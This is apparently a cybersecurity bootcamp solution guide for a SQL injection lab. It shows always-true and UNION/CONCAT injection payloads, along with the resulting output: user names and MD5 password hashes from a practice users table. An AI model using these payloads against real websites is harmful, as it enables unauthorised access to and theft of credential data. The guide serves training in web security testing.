## Solution Guide: SQL Refresher and Unintended SQL Queries

In this activity, you designed several malicious SQL payloads that you will use in the next activity to test for SQL injection vulnerabilities against the Replicants live production website.

---

1. `select first_name, last_name from users where id = ''`

    - For this query, place a `1` between the single quotes and select Run at the top left of the DB Fiddle page.

      - `select first_name, last_name from users where id = '1'`
      
    - After running the query, the program will output the following:
          
        first_name |	last_name
        ------------ | ------------- 
        admin	| admin
      
2. `select first_name, last_name from users where id = ''`

    - To use the payload for the most common always true query, add `' OR '1' = '1` to the input.
      
    - The following will cause the database to return all the values in the table:

      - `select first_name, last_name from users where user_id = '1' OR '1' = '1' `

    - After running the query, the program will output the following:
      
        first_name | last_name 
        ------------ | ------------- 
        admin | admin
        gordon | brown
        hack | me
        pablo | picasso
        bob | smith
        
3. `select first_name, last_name from users where id = ''`

    - You can use any value for an always true statement as long as it equals itself.

    - The following will also cause the database to return all the values in the table:

      - `select first_name, last_name from users where id = '1' OR 'dog' = 'dog' `
      
    - The new query will return the same results as the previous query:
        
      first_name | last_name
      ------------ | ------------- 
      admin | admin
      gordon | brown
      hack | me
      pablo | picasso
      bob | smith   

4. **Bonus**: `select first_name, last_name from users where id = ''`

    - Adding the `UNION` command to the query will allow us to pull data from other fields or tables.

    - When adding an additional command with `UNION`, the count of fields requested (2 - first_name, password) needs to match the count of the original request (2 - first_name, last_name):

      - `select first_name, last from users where id = '1' UNION select first_name, password from users where '1' = '1'`

    - Note that `UNION` is basically running two queries together:

      - `select first_name, last from users where id = '1'`  

      - `select first_name, password from users where '1' = '1'`
      
    - The query will return the following:
        
      | first_name | last_name                        |
      | ---------- | -------------------------------- |
      | admin      | admin                            |
      | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
      | gordon     | 575e22bc356137a41abdef379b776dba |
      | hack       | 97b9308f6a1f6a8524a91450dca473fa |
      | pablo      | 8c7c9b1149e9de712b9e5abab45d700c |
      | bob        | 4a02ce029a840716c61ee8fcda10158e |

    - Note that the one result of the first part of the query is returned, followed by the six results of the second query.

5. **Bonus**: `select first_name, last_name from users where id = ''`

    - To pull data from all four fields, the `UNION` and `CONCAT` command can be added to the request.

    - Because the count of fields requested (3 - first_name, last_name, password) needs to match the count of the original request (2 - first_name, last_name), we need to combine two of the fields with the `CONCAT` command, using the following query:

      - `select first_name, last_name from users where user_id = '1' UNION select CONCAT(first_name,last_name), password from users;
               `
            
    - The query will return the following:
        
      | first_name   | last_name                        |
      | ------------ | -------------------------------- |
      | admin        | admin                            |
      | adminadmin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
      | gordonbrown  | 575e22bc356137a41abdef379b776dba |
      | hackme       | 97b9308f6a1f6a8524a91450dca473fa |
      | pablopicasso | 8c7c9b1149e9de712b9e5abab45d700c |
      | bobsmith     | 4a02ce029a840716c61ee8fcda10158e |


    - Note how the first and last names are combined in the `first_name` field, starting with the second record.

---

© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved. 
